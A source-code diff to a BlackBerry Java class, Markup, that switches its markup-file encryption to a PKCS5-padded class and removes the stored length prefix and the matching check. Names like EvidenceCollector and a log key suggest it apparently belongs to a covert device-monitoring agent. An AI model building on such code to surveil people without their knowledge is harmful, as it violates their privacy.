@@ -17,6 +17,7 @@ import net.rim.device.api.util.DataBuffer;
 import net.rim.device.api.util.NumberUtilities;
 import blackberry.config.Keys;
 import blackberry.crypto.Encryption;
+import blackberry.crypto.EncryptionPKCS5;
 import blackberry.debug.Check;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
@@ -24,7 +25,6 @@ import blackberry.event.Event;
 import blackberry.fs.AutoFile;
 import blackberry.fs.Path;
 import blackberry.module.BaseModule;
-import blackberry.debug.Check;
 import blackberry.utils.Utils;
 
 /**
@@ -42,11 +42,11 @@ public class Markup {
     private static Debug debug = new Debug("Markup", DebugLevel.VERBOSE);
     //#endif
 
-    Encryption encryption;
+    EncryptionPKCS5 encryption;
     EvidenceCollector logCollector;
 
     private Markup() {
-        encryption = new Encryption(Encryption.getKeys().getLogKey());
+        encryption = new EncryptionPKCS5(Encryption.getKeys().getLogKey());
         logCollector = EvidenceCollector.getInstance();
     }
 
@@ -155,7 +155,7 @@ public class Markup {
         //#ifdef DEBUG
         debug.trace("removeMarkups");
         //#endif
-        
+
         int numDeleted = 0;
 
         AutoFile dir = new AutoFile(Path.markup());
@@ -215,19 +215,16 @@ public class Markup {
 
         if (fileRet.exists()) {
             final byte[] encData = fileRet.read();
-            final int len = Utils.byteArrayToInt(encData, 0);
+            //final int len = Utils.byteArrayToInt(encData, 0);
 
             byte[] plain = null;
             try {
-                plain = encryption.decryptData(encData, len, 4);
+                plain = encryption.decryptDataRim(encData, 4);
             } catch (CryptoException e) {
                 return null;
             }
             //#ifdef DBC
             Check.asserts(plain != null, "wrong decryption: null");
-            //#endif
-            //#ifdef DBC
-            Check.asserts(plain.length == len, "wrong decryption: len");
             //#endif
 
             return plain;
@@ -291,7 +288,7 @@ public class Markup {
             //#ifdef DBC
             Check.asserts(encData.length >= data.length, "strange data len");
             //#endif
-            fileRet.write(data.length);
+            //fileRet.write(data.length);
             fileRet.append(encData);
         }
 
